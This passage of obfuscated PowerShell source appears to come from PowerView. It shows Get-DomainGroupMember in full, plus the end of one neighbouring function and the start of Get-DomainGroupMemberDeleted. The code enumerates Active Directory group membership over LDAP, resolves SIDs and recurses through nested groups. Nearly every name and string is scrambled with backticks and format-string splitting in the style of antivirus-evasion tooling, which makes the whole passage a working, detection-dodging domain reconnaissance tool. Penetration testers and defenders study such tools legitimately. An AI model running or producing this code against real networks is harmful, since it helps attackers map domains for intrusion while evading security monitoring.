            ${Ma`NagED`GR`Oup}."psOB`Je`Ct"."tYPENA`m`eS".("{0}{1}"-f'I','nsert').Invoke(0, ("{5}{7}{1}{8}{4}{3}{2}{6}{0}" -f 'Group','.Ma','Secu','ed','ag','Powe','rity','rView','n'))
            ${MaN`AgEDgR`o`Up}
        }
    }
}


function get-Do`maIngRou`PMem`BeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}{4}" -f 'ul','P','dPr','SSho','ocess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{6}{7}{0}{3}{5}{2}{1}"-f'or','nts','e','eThanAs','PS','signm','U','seDeclaredVarsM'}, '')]
    [OutputType({"{2}{0}{1}{5}{6}{4}{3}" -f 'we','rVie','Po','r','mbe','w.Group','Me'})]
    [CmdletBinding(DeFaULtpaRAMeTERSeTNAmE = {"{0}{1}" -f'N','one'})]
    Param(
        [Parameter(positIon = 0, MAnDatory = ${tR`UE}, vaLUEfroMpIPEliNe = ${tR`Ue}, VAlueFromPipELInebYPRopErTYnamE = ${t`Rue})]
        [Alias({"{3}{2}{1}{0}{4}" -f 'shedNa','stingui','i','D','me'}, {"{4}{2}{3}{0}{1}"-f'untNam','e','Acc','o','Sam'}, {"{0}{1}"-f'Nam','e'}, {"{2}{1}{4}{3}{0}"-f 'dName','e','M','erDistinguishe','mb'}, {"{2}{1}{0}"-f'Name','mber','Me'})]
        [String[]]
        ${i`d`entiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omAIN},

        [Parameter(pAramETersetnaMe = "man`UA`LRE`cuRsE")]
        [Switch]
        ${reCu`R`se},

        [Parameter(pARaMeTERseTNAme = "rec`Ur`sEUsIN`GM`AtCHI`NgrU`Le")]
        [Switch]
        ${rEcUrseus`inGM`A`TCHiNg`RULE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Filt','er'})]
        [String]
        ${L`DapfILt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSP','ath'})]
        [String]
        ${sE`ARCHb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{4}{3}{2}"-f'Do','main','r','ntrolle','Co'})]
        [String]
        ${S`ERV`eR},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{1}{0}"-f'l','OneLeve'}, {"{2}{1}{0}" -f 'ree','t','Sub'})]
        [String]
        ${s`E`ARcHSCo`pe} = ("{0}{1}{2}"-f 'Sub','tr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSultPa`G`eSi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`R`VERtimeLIm`it},

        [ValidateSet({"{0}{1}"-f 'D','acl'}, {"{1}{0}"-f 'p','Grou'}, {"{1}{0}" -f'e','Non'}, {"{1}{0}"-f 'wner','O'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${sEcuR`Itymas`KS},

        [Switch]
        ${t`ombst`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`e`NT`iAL} =   ${7`TQ02}::"eM`Pty"
    )

    BEGIN {
        ${S`ea`RCHERARGUmeN`TS} = @{
            ("{2}{0}{1}" -f 'ie','s','Propert') = ("{8}{5}{6}{9}{7}{0}{1}{4}{2}{3}"-f 'ntname,dist','in','i','shedname','gu','a','macc','u','member,s','o')
        }
        if (${PSbOu`Ndpa`RAmETE`Rs}[("{1}{0}" -f'n','Domai')]) { ${sE`Arch`er`Ar`g`UmeNTS}[("{1}{0}" -f'ain','Dom')] = ${D`o`MaIN} }
        if (${P`SBoU`Ndp`ArAME`T`eRs}[("{2}{3}{0}{1}"-f'te','r','LDA','PFil')]) { ${sEaRcherar`gu`ME`NtS}[("{2}{0}{1}"-f'Filte','r','LDAP')] = ${LdAP`F`IlTer} }
        if (${ps`BoUN`DPaRAMeT`ErS}[("{2}{0}{1}" -f 'rchB','ase','Sea')]) { ${sE`ARch`E`RArgUME`NTS}[("{1}{2}{0}" -f 'hBase','Sea','rc')] = ${SEar`c`hBA`SE} }
        if (${p`SBO`Un`dpa`RAMetE`RS}[("{0}{1}"-f'Ser','ver')]) { ${s`EaRcheR`A`RG`Uments}[("{1}{0}{2}" -f'r','Se','ver')] = ${s`eRV`ER} }
        if (${pSb`O`UNdPA`RAmETErS}[("{0}{2}{1}{3}" -f'Sea','Sc','rch','ope')]) { ${seaRChe`R`Arg`UmENTs}[("{2}{1}{0}"-f'chScope','ear','S')] = ${se`Ar`ChsCo`pe} }
        if (${Psb`OUNDP`A`RAmETErs}[("{2}{0}{3}{1}"-f'esu','ageSize','R','ltP')]) { ${seA`RCheRA`RGU`MenTS}[("{1}{0}{3}{4}{2}"-f 'esu','R','e','ltPag','eSiz')] = ${resuLtp`Ag`e`SI`zE} }
        if (${Ps`BO`U`NDpArame`T`eRS}[("{2}{0}{1}{4}{3}"-f 'Tim','eLi','Server','it','m')]) { ${SEArC`h`eraR`GUmE`NTs}[("{3}{1}{4}{0}{2}"-f 'm','erT','eLimit','Serv','i')] = ${sERVe`Rti`M`eLIM`It} }
        if (${p`SB`ouNDpaRaM`EtE`Rs}[("{0}{2}{1}" -f 'T','ne','ombsto')]) { ${SeA`RcHe`Rar`guMenTS}[("{1}{0}" -f 'tone','Tombs')] = ${T`oMBSTo`NE} }
        if (${Psb`oUn`DPAr`A`MET`Ers}[("{1}{2}{0}" -f 'tial','Crede','n')]) { ${S`earCheRA`R`GuMeNTs}[("{0}{2}{1}" -f'Cr','l','edentia')] = ${creDe`Nt`ial} }

        ${AdNa`mEarGUm`en`TS} = @{}
        if (${psBo`UNDpA`R`AmeT`ERs}[("{0}{1}{2}" -f'Do','m','ain')]) { ${AdN`AmEarg`Um`eNTS}[("{0}{1}" -f'Doma','in')] = ${Do`MAIN} }
        if (${Psbound`PARa`me`Te`Rs}[("{1}{0}" -f'rver','Se')]) { ${ADNAm`earg`UmEntS}[("{0}{1}"-f 'Se','rver')] = ${Se`R`VEr} }
        if (${Psb`Oun`dpa`Rame`TE`Rs}[("{1}{2}{0}"-f'tial','Cre','den')]) { ${adnA`mE`Ar`GU`MeNTs}[("{0}{2}{3}{1}" -f 'C','ial','rede','nt')] = ${Cr`e`DENT`ial} }
    }

    PROCESS {
        ${g`RoUP`S`EARCHer} = &("{1}{4}{0}{2}{3}"-f'omai','Get-','nSear','cher','D') @SearcherArguments
        if (${Gro`U`PSeA`Rcher}) {
            if (${ps`B`o`UNDPArAm`eTERs}[("{3}{2}{4}{1}{5}{0}{7}{6}"-f'ng','n','se','Recur','Usi','gMatchi','ule','R')]) {
                ${se`ARCH`er`ArGu`mEnTs}[("{1}{0}" -f'ity','Ident')] = ${i`DeNt`ITy}
                ${SEARC`hErarG`U`me`NTs}['Raw'] = ${Tr`UE}
                ${g`Roup} = &("{0}{1}{3}{2}"-f'Get-Do','ma','nGroup','i') @SearcherArguments

                if (-not ${g`RO`UP}) {
                    &("{0}{2}{1}"-f'Writ','rning','e-Wa') ('[Get-Domai'+'nGro'+'upM'+'emb'+'e'+'r] '+'Er'+'ror '+'search'+'in'+'g'+' '+'f'+'or '+'gro'+'up'+' '+'wi'+'th '+'id'+'en'+'tity: '+"$Identity")
                }
                else {
                    ${g`RO`UPfouNdnA`mE} = ${gR`OuP}."proPeR`T`iES".("{0}{1}" -f 'it','em').Invoke(("{2}{3}{0}{1}{4}"-f 'acc','oun','sa','m','tname'))[0]
                    ${Gro`UpfOu`N`Ddn} = ${gR`OUP}."pR`Op`ERtIeS".("{1}{0}" -f 'tem','i').Invoke(("{1}{3}{4}{2}{0}"-f 'e','dis','dnam','t','inguishe'))[0]

                    if (${PS`B`ounDpAr`AMetE`Rs}[("{0}{1}"-f 'Do','main')]) {
                        ${G`RoU`Pf`OU`NDDOmaiN} = ${DoMa`IN}
                    }
                    else {
                        
                        if (${g`R`oUpf`OUNDdN}) {
                            ${Gr`ouPFou`Ndd`oMAin} = ${g`RoUPfoun`d`Dn}.("{1}{0}{2}"-f'bS','Su','tring').Invoke(${gR`oUPFOuNd`DN}.("{0}{1}"-f'Inde','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{0}{2}{1}{3}"-f'Write','rbos','-Ve','e') ('[Ge'+'t-D'+'omainGro'+'up'+'Member] '+'Usin'+'g '+'LD'+'AP '+'matchin'+'g '+'ru'+'le '+'t'+'o '+'recu'+'r'+'se '+'o'+'n '+"'$GroupFoundDN', "+'o'+'nly '+'user'+' '+'acc'+'o'+'un'+'ts '+'w'+'ill '+'b'+'e '+'retu'+'r'+'ned.')
                    ${G`RO`UPSEArch`eR}."fi`lteR" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${gro`U`ps`EARcher}."pR`Ope`R`TIesto`LO`AD".("{1}{0}{2}" -f'n','AddRa','ge').Invoke((("{0}{3}{4}{2}{1}" -f 'distingu','e','edNam','is','h')))
                    ${m`E`MbErs} = ${GroUPSe`A`RC`h`er}.("{2}{1}{0}"-f'All','nd','Fi').Invoke() | &("{0}{3}{1}{2}" -f'ForEac','j','ect','h-Ob') {${_}."PR`OPer`T`iEs"."dI`S`TiNG`Uishe`dN`AmE"[0]}
                }
                ${Nu`ll} = ${sEA`RCHE`RAr`gUMEN`TS}.("{1}{0}"-f'emove','R').Invoke('Raw')
            }
            else {
                ${Iden`T`ITyf`i`lTER} = ''
                ${FI`lTEr} = ''
                ${ideNt`iTY} | &("{2}{1}{0}{3}"-f 'bjec','O','Where-','t') {${_}} | &("{1}{0}{3}{2}" -f'rEa','Fo','ect','ch-Obj') {
                    ${iD`E`NtitYiNSt`ANCE} = ${_}.("{0}{2}{1}" -f 'Re','lace','p').Invoke('(', '\28').("{1}{0}"-f 'ace','Repl').Invoke(')', '\29')
                    if (${I`de`NtIt`YiN`s`TANCe} -match ("{1}{0}"-f'-','^S-1')) {
                        ${i`dentI`TyfIlter} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${id`e`NTitYi`NstAncE} -match ("{1}{0}" -f'N=','^C')) {
                        ${Id`EN`TiTY`FiLTEr} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${P`SBO`Und`pAr`Amet`ers}[("{0}{2}{1}"-f 'D','main','o')]) -and (-not ${pSb`ou`NdparAmEte`RS}[("{0}{1}{2}"-f 'Searc','h','Base')])) {
                            
                            
                            ${I`dentiT`YdOMA`In} = ${idE`NTI`TyIN`STancE}.("{2}{1}{0}"-f'ng','ri','SubSt').Invoke(${i`De`NT`ItYinSt`AN`ce}.("{0}{2}{1}"-f'In','Of','dex').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{0}{2}" -f 'rb','Write-Ve','ose') ('[G'+'et-Doma'+'inG'+'roup'+'Me'+'m'+'ber] '+'Ext'+'r'+'acte'+'d '+'do'+'ma'+'in '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${s`Ear`chE`RArGUmenTS}[("{1}{0}"-f'ain','Dom')] = ${iDE`NTiTy`DOMa`in}
                            ${GroUp`SEaRch`eR} = &("{4}{2}{1}{5}{0}{3}" -f 'inSearc','o','t-D','her','Ge','ma') @SearcherArguments
                            if (-not ${grouPS`E`AR`chEr}) {
                                &("{3}{1}{2}{0}" -f 'ing','i','te-Warn','Wr') ('[Get'+'-Doma'+'in'+'G'+'roup'+'Me'+'mber] '+'U'+'nabl'+'e '+'t'+'o '+'retrie'+'ve'+' '+'d'+'o'+'main '+'se'+'a'+'rcher '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${iDe`N`TIT`YiNs`Tance} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${gU`id`BY`TEStR`iNg} = (([Guid]${i`deNtiTyI`NSt`A`Nce}).("{0}{1}{3}{2}" -f'T','oByteAr','ay','r').Invoke() | &("{3}{0}{2}{1}" -f 'orEach-Obj','t','ec','F') { '\' + ${_}.("{0}{1}{2}" -f 'To','S','tring').Invoke('X2') }) -join ''
                        ${I`DENtiTyf`I`L`TEr} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${Ide`NTitYin`STAn`cE}.("{2}{0}{1}" -f 'ai','ns','Cont').Invoke('\')) {
                        ${conv`Ertedide`NtITyI`Nst`A`Nce} = ${IdE`NtITyIn`s`Tan`ce}.("{0}{1}"-f 'Repl','ace').Invoke('\28', '(').("{1}{2}{0}"-f'ce','Rep','la').Invoke('\29', ')') | &("{0}{1}{2}{3}" -f'Co','nvert-','AD','Name') -OutputType ("{1}{0}{2}" -f'non','Ca','ical')
                        if (${CO`NVeR`T`EDiDEntIT`yiN`staN`Ce}) {
                            ${GR`oUp`do`Main} = ${ConV`ER`T`EDidEntITy`i`N`S`TancE}.("{2}{0}{1}"-f 'tr','ing','SubS').Invoke(0, ${C`OnVe`RteDI`De`NT`ityinsTaNce}.("{2}{1}{0}" -f'exOf','nd','I').Invoke('/'))
                            ${g`ROu`PNAMe} = ${i`d`eNt`I`TYINsTa`Nce}.("{1}{0}"-f'lit','Sp').Invoke('\')[1]
                            ${ide`N`TITy`FIlTeR} += "(samAccountName=$GroupName)"
                            ${S`ea`RC`He`RarG`UmENts}[("{1}{0}{2}" -f'ai','Dom','n')] = ${gROuPdO`Ma`iN}
                            &("{2}{0}{1}{3}" -f 'rit','e-V','W','erbose') ('[Ge'+'t-Domain'+'G'+'roupMe'+'mber'+'] '+'E'+'xtract'+'e'+'d '+'dom'+'a'+'in '+"'$GroupDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${GrO`U`pSearChEr} = &("{1}{3}{0}{5}{4}{2}"-f'in','G','er','et-Doma','ch','Sear') @SearcherArguments
                        }
                    }
                    else {
                        ${iden`TitY`FI`lT`Er} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${I`DENTit`yf`ilTer} -and (${idENT`IT`Y`FIltER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                    ${Fi`LtER} += "(|$IdentityFilter)"
                }

                if (${PsbO`UnDP`A`R`A`MetErs}[("{1}{0}{2}"-f'PFilt','LDA','er')]) {
                    &("{0}{1}{2}" -f 'Write-V','er','bose') ('[G'+'e'+'t'+'-D'+'omain'+'Gr'+'oupMember] '+'U'+'sing '+'addit'+'ion'+'al '+'LD'+'AP '+'filt'+'e'+'r: '+"$LDAPFilter")
                    ${f`ILteR} += "$LDAPFilter"
                }

                ${GrouPSEA`RcH`ER}."FI`Lt`Er" = "(&(objectCategory=group)$Filter)"
                &("{0}{2}{1}"-f 'Write','rbose','-Ve') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${RE`SuLt} = ${g`ROup`sEaRcher}.("{2}{1}{0}"-f 'ne','indO','F').Invoke()
                }
                catch {
                    &("{1}{0}{2}" -f'rni','Write-Wa','ng') ('[Get-D'+'omainGrou'+'pMemb'+'er'+']'+' '+'Err'+'or '+'sea'+'rching'+' '+'f'+'or '+'grou'+'p '+'with'+' '+'identi'+'ty'+' '+"'$Identity': "+"$_")
                    ${MeM`B`eRs} = @()
                }

                ${gROUpFou`Nd`Na`Me} = ''
                ${Gr`ouP`Fo`UNDdn} = ''

                if (${reSu`lT}) {
                    ${Me`mBE`RS} = ${re`S`ULt}."p`R`opeRties".("{1}{0}" -f'em','it').Invoke(("{0}{1}" -f 'mem','ber'))

                    if (${m`E`MBErS}."Cou`NT" -eq 0) {
                        
                        ${Fin`Is`HeD} = ${faL`se}
                        ${BO`T`TOm} = 0
                        ${T`op} = 0

                        while (-not ${FI`NIS`hed}) {
                            ${T`op} = ${b`Ottom} + 1499
                            ${meM`Ber`Ran`GE}="member;range=$Bottom-$Top"
                            ${bOT`ToM} += 1500
                            ${nu`ll} = ${gRo`U`Psea`R`CHER}."prOPer`Ti`ESTOL`OaD".("{1}{0}"-f'r','Clea').Invoke()
                            ${nu`ll} = ${gRou`PseaRC`h`Er}."pRoPer`TI`eSTo`lOAD".("{0}{1}" -f 'A','dd').Invoke("$MemberRange")
                            ${N`ULL} = ${gROu`ps`eAR`Ch`eR}."pRoP`ERtI`E`STOLoaD".("{0}{1}"-f 'Ad','d').Invoke(("{3}{1}{0}{2}"-f'countna','amac','me','s'))
                            ${N`ULl} = ${Gro`U`PSeA`R`Cher}."P`R`OpeRTiESt`olOaD".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}{3}"-f'ish','disti','ngu','edname'))

                            try {
                                ${R`E`sULT} = ${gR`OUpse`A`RCH`ER}.("{0}{1}{2}"-f'FindO','n','e').Invoke()
                                ${R`ANgE`DPrO`perty} = ${rE`sulT}."PRo`Per`Ties"."p`R`oP`E`RtyNaMES" -like ("{1}{2}{0}{4}{3}"-f 'ber;ran','m','em','e=*','g')
                                ${memb`eRS} += ${rE`S`ULT}."p`Ro`pERTies".("{1}{0}"-f 'em','it').Invoke(${RANGed`PrO`pEr`Ty})
                                ${GrOu`Pf`o`UNdNAMe} = ${Re`suLt}."PR`ope`RtIes".("{1}{0}"-f 'em','it').Invoke(("{2}{3}{0}{1}" -f 'u','ntname','s','amacco'))[0]
                                ${g`Roup`F`oUndDn} = ${reS`ULt}."prOP`er`TiES".("{0}{1}" -f 'ite','m').Invoke(("{1}{2}{3}{0}"-f'e','di','stinguis','hednam'))[0]

                                if (${Mem`B`erS}."c`ount" -eq 0) {
                                    ${FInI`shEd} = ${T`RUe}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${fi`NIS`HED} = ${T`RuE}
                            }
                        }
                    }
                    else {
                        ${g`R`Ou`Pfo`UNdNAMe} = ${rE`S`Ult}."pROp`Er`T`IeS".("{0}{1}" -f'it','em').Invoke(("{2}{0}{3}{1}"-f 'macco','e','sa','untnam'))[0]
                        ${gROU`PFO`UnDdn} = ${r`es`ULt}."PrO`p`ErtIes".("{0}{1}" -f 'ite','m').Invoke(("{4}{1}{3}{2}{0}"-f 'name','ting','ished','u','dis'))[0]
                        ${MemB`Ers} += ${R`esUlt}."p`R`OPerT`ieS".("{1}{0}"-f 'tem','i').Invoke(${r`ANGE`dPR`opeRtY})
                    }

                    if (${PSb`O`Und`pa`RAMeteRs}[("{1}{0}"-f'ain','Dom')]) {
                        ${g`ROUP`FoUN`dDOM`AIn} = ${d`o`MaIn}
                    }
                    else {
                        
                        if (${gRou`PFO`UnD`dn}) {
                            ${gROUpFo`UN`D`dO`main} = ${GroUpFO`U`ND`Dn}.("{1}{2}{0}" -f 'ring','Su','bSt').Invoke(${gRoU`P`Fo`UNd`Dn}.("{0}{2}{1}" -f 'I','xOf','nde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${m`eMb`Er} in ${Mem`B`ers}) {
                if (${recU`R`se} -and ${uS`Em`AtChI`N`gRu`Le}) {
                    ${PrOpe`RTi`ES} = ${_}."pRoPE`R`TI`Es"
                }
                else {
                    ${ObjECtSeArC`HERar`g`UME`Nts} = ${sea`R`ChErarGU`M`eNTS}.("{1}{0}"-f'e','Clon').Invoke()
                    ${O`BjE`c`TSEArChEr`ARgU`Ments}[("{1}{2}{0}" -f 'ity','Iden','t')] = ${m`EmBEr}
                    ${OBjEctS`eA`RCHe`Ra`RGu`m`enTS}['Raw'] = ${tR`UE}
                    ${O`B`jECtsear`CheRargU`ME`NtS}[("{1}{2}{0}" -f 'ies','Prop','ert')] = ("{14}{9}{3}{13}{6}{10}{2}{11}{12}{0}{4}{17}{15}{7}{16}{1}{8}{5}"-f'count','ob','s','she','name,o','ctclass','name,','id','je','ingui','cn,','a','mac','d','dist','ects',',','bj')
                    ${Obje`ct} = &("{0}{3}{2}{1}{4}" -f 'Get-DomainOb','c','e','j','t') @ObjectSearcherArguments
                    ${p`ROpeRT`iEs} = ${obJ`ECt}."pRopeRT`i`es"
                }

                if (${PROPe`R`T`iES}) {
                    ${grou`pM`EmBEr} = &("{2}{0}{3}{1}" -f 'e','Object','N','w-') ("{2}{0}{1}" -f 'bj','ect','PSO')
                    ${gROuPME`mb`ER} | &("{1}{0}{2}"-f '-M','Add','ember') ("{2}{1}{0}"-f'y','opert','Notepr') ("{2}{3}{1}{0}" -f 'n','oupDomai','G','r') ${G`RO`U`pFoUnDdo`m`Ain}
                    ${groUpm`EMb`Er} | &("{1}{0}{2}"-f'd-Mem','Ad','ber') ("{1}{3}{2}{0}" -f'ty','Not','proper','e') ("{2}{0}{1}"-f 'up','Name','Gro') ${gRO`UPf`o`UnDnAMe}
                    ${G`ROuP`mEMBeR} | &("{2}{3}{0}{1}"-f 'b','er','Ad','d-Mem') ("{0}{1}{2}" -f'Note','propert','y') ("{2}{4}{3}{0}{1}" -f 'stinguishe','dName','Gro','Di','up') ${gR`O`UpF`OUnD`dN}

                    if (${PR`oP`eRt`IEs}."obJEC`TSiD") {
                        ${MeMB`E`RsID} = ((&("{2}{1}{0}" -f'ject','-Ob','New') ("{5}{1}{3}{7}{2}{0}{4}{6}" -f'al.SecurityIdentif','em.Secu','p','rity.Princ','ie','Syst','r','i') ${PR`OperTi`es}."o`BjEc`T`sId"[0], 0)."Val`Ue")
                    }
                    else {
                        ${meM`BErS`iD} = ${Nu`LL}
                    }

                    try {
                        ${MEmbE`R`dn} = ${PR`O`p`ertIes}."DistinGUIs`he`DnA`mE"[0]
                        if (${MEmb`e`Rdn} -match ((("{4}{2}{7}{1}{9}{0}{3}{5}{8}{6}"-f'ZS','s4','nSecurityPrinci','-1','Foreig','-5','1','pal','-2','a'))."rePla`Ce"(([ChaR]52+[ChaR]97+[ChaR]90),'|'))) {
                            try {
                                if (-not ${Me`MBERs`id}) {
                                    ${Me`MbeRS`id} = ${P`Rop`ER`TiES}."cN"[0]
                                }
                                ${MEmbER`si`MP`lEN`Ame} = &("{2}{0}{3}{1}"-f 't-','Name','Conver','AD') -Identity ${ME`mBer`SId} -OutputType ("{3}{1}{2}{0}" -f 'imple','o','mainS','D') @ADNameArguments

                                if (${mEM`BeRSiMP`lenA`Me}) {
                                    ${M`emB`E`Rd`omain} = ${Me`mBErsIm`p`LenAmE}.("{0}{1}"-f 'Sp','lit').Invoke('@')[1]
                                }
                                else {
                                    &("{3}{2}{1}{0}{4}" -f 'i','rn','e-Wa','Writ','ng') ('[Ge'+'t'+'-DomainGroupMe'+'m'+'b'+'er] '+'E'+'rror '+'conver'+'t'+'ing '+"$MemberDN")
                                    ${ME`MB`ErDoma`IN} = ${n`UlL}
                                }
                            }
                            catch {
                                &("{1}{3}{0}{2}"-f 'r','Write-W','ning','a') ('['+'Get-Domai'+'nGroup'+'M'+'emb'+'er] '+'Erro'+'r'+' '+'con'+'vert'+'i'+'ng '+"$MemberDN")
                                ${mE`M`B`Er`DOMAIN} = ${nu`Ll}
                            }
                        }
                        else {
                            
                            ${mEmBeRD`o`Ma`In} = ${mE`m`BeRdn}.("{0}{1}"-f 'Su','bString').Invoke(${Me`MBER`dn}.("{1}{0}"-f 'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${MEm`Berdn} = ${n`UlL}
                        ${ME`Mb`e`R`Domain} = ${nu`LL}
                    }

                    if (${pro`pertI`es}."sAM`ACCOuN`Tn`AMe") {
                        
                        ${MEmb`E`RNA`ME} = ${PrOP`erTi`es}."S`Am`AcCOUnt`N`AME"[0]
                    }
                    else {
                        
                        try {
                            ${mem`BeR`NamE} = &("{1}{2}{0}{3}{4}" -f'n','C','o','vert','From-SID') -ObjectSID ${pROp`E`R`TIES}."Cn"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${m`em`BeRn`Ame} = ${pR`OPer`TIeS}."C`N"[0]
                        }
                    }

                    if (${PrOPeRT`I`ES}."objec`T`cLaSs" -match ("{0}{1}{2}" -f 'com','p','uter')) {
                        ${memBER`Ob`jectcLA`Ss} = ("{1}{2}{0}"-f 'er','com','put')
                    }
                    elseif (${P`ROP`eRt`ies}."obJeC`TcLA`SS" -match ("{1}{0}"-f 'up','gro')) {
                        ${M`eMberoBj`EcT`ClAsS} = ("{0}{1}" -f 'g','roup')
                    }
                    elseif (${p`ROp`ErTieS}."OBj`EcT`C`LaSs" -match ("{1}{0}"-f'er','us')) {
                        ${mEMBERoB`jeC`T`c`LA`ss} = ("{0}{1}" -f'use','r')
                    }
                    else {
                        ${mem`B`eRO`Bjec`Tc`LAss} = ${N`ULl}
                    }
                    ${G`R`OupM`eMBeR} | &("{2}{0}{1}" -f'-Mem','ber','Add') ("{2}{1}{0}" -f'erty','op','Notepr') ("{1}{0}{2}{3}"-f'ember','M','Doma','in') ${M`emB`eRDoM`A`in}
                    ${g`R`O`UPMEMbER} | &("{2}{0}{1}"-f'-Membe','r','Add') ("{2}{3}{0}{1}"-f'ert','y','Notepro','p') ("{1}{2}{3}{0}" -f 'Name','Me','m','ber') ${mEMbe`RN`AME}
                    ${GrOup`m`E`mbEr} | &("{2}{1}{0}" -f'mber','Me','Add-') ("{0}{1}{2}{3}"-f 'N','otep','r','operty') ("{5}{1}{2}{0}{4}{3}{6}"-f 'Di','mbe','r','hedNam','stinguis','Me','e') ${m`e`Mberdn}
                    ${G`RouPmEm`Ber} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{0}{1}{2}" -f 'No','te','property') ("{0}{1}{2}{3}" -f'MemberObj','ec','tCl','ass') ${MEM`B`erOBj`eCTcLAsS}
                    ${gR`Oupm`EMb`ER} | &("{1}{0}{2}" -f'd-Memb','Ad','er') ("{0}{2}{3}{1}" -f 'Notepr','rty','o','pe') ("{1}{0}" -f'ID','MemberS') ${mEmB`er`Sid}
                    ${gRO`UpmemB`er}."pSOBje`Ct"."t`Y`pEn`Ames".("{0}{1}"-f'I','nsert').Invoke(0, ("{1}{2}{4}{0}{3}" -f 'rou','Po','werView.','pMember','G'))
                    ${gro`UP`m`emBEr}

                    
                    if (${p`sBO`U`NDpARamETerS}[("{0}{1}"-f 'Recu','rse')] -and ${Mem`Be`Rdn} -and (${MEMBeROb`jeCT`cL`Ass} -match ("{1}{0}"-f'roup','g'))) {
                        &("{0}{1}{2}" -f 'Write-Ve','r','bose') ('[Get-Doma'+'inGro'+'u'+'p'+'Member] '+'M'+'anua'+'lly '+'recur'+'sin'+'g '+'o'+'n '+'g'+'roup: '+"$MemberDN")
                        ${SeA`RchE`RArGu`Men`TS}[("{0}{2}{1}" -f'Iden','y','tit')] = ${mem`BeR`dN}
                        ${Nu`Ll} = ${sEArCH`ERARg`Ume`NTs}.("{1}{0}"-f 've','Remo').Invoke(("{2}{0}{1}" -f't','ies','Proper'))
                        &("{2}{4}{5}{0}{6}{1}{3}" -f '-Domai','Group','G','Member','e','t','n') @SearcherArguments
                    }
                }
            }
            ${GR`o`Up`Sear`CheR}.("{1}{0}"-f'se','dispo').Invoke()
        }
    }
}


function gEt-d`o`maing`ROu`pmeMbe`Rdele`TEd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{3}{2}{0}{1}{4}{5}"-f 'ec','laredVarsMoreThanAss','D','SUse','ignmen','ts','P'}, '')]
    [OutputType({"{1}{5}{7}{6}{3}{8}{2}{0}{4}" -f'e','Po','mberD','nGr','leted','werVie','i','w.Doma','oupMe'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITION = 0, vaLuEFROmPipeliNe = ${TR`UE}, vAluEfRompiPElINEBYproPERtYNAme = ${T`RUE})]
        [Alias({"{0}{3}{1}{2}"-f'Dis','ishe','dName','tingu'}, {"{0}{1}{2}"-f 'Sam','Account','Name'}, {"{1}{0}"-f'me','Na'}, {"{0}{5}{3}{4}{2}{1}{6}"-f'M','he','tinguis','mber','Dis','e','dName'}, {"{1}{2}{0}" -f'Name','Me','mber'})]
        [String[]]
        ${i`dENTITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'lter','i','F'})]
        [String]
        ${lD`A`pfiLTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'th','a','ADSP'})]
        [String]
        ${S`E`ArcH`BASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{2}{1}"-f't','er','roll','n','DomainCo'})]
        [String]
        ${s`e`RVER},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{1}{2}" -f'O','neL','evel'}, {"{1}{0}" -f'tree','Sub'})]
        [String]
        ${SeaR`c`HSCO`pE} = ("{1}{0}"-f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`LTPaGe`Si`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serv`eRTI`me`lI`mIt},

        [Switch]
        ${T`O`MBStO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDEnT`i`AL} =  ${7T`q02}::"Emp`TY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${SeA`RC`heraRGuMe`N`Ts} = @{
            ("{2}{0}{1}"-f'i','es','Propert')    =   ("{3}{1}{6}{5}{2}{0}{4}" -f 'tada','s','lvalueme','m','ta','ep','ds-r'),("{3}{1}{2}{0}"-f'ame','tinguis','hedn','dis')
            'Raw'           =   ${t`RUE}
            ("{1}{0}{2}" -f 'APFi','LD','lter')    =   (("{3}{0}{2}{1}"-f'bjectCa','gory=group)','te','(o'))
        }
        if (${PSbOUn`D`pA`RamETe`Rs}[("{1}{0}" -f 'in','Doma')]) { ${SEa`RCHeR`Arg`UM`EnTS}[("{0}{1}" -f 'Doma','in')] = ${D`oM`AIn} }
